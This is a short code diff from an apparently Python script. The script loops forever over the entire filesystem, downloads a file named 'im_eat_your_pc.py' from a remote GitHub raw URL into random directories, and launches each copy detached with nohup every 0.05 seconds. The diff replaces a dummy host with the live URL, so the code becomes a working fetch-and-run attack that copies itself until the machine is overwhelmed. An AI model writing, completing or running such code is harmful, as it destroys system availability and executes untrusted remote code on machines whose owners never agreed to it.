@@ -12,6 +12,6 @@ while 1:
     a = [os.path.join(r, d) for r, dirs, files in os.walk("/") for d in dirs]
     if a:
         r = random.choice(a)
-        f = d("https://dkxkdjx/im_eat_your_pc.py", r)
+        f = d("https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/im_eat_your_pc.py", r)
         subprocess.Popen(['nohup', 'python', f, '&'])
     time.sleep(0.05)
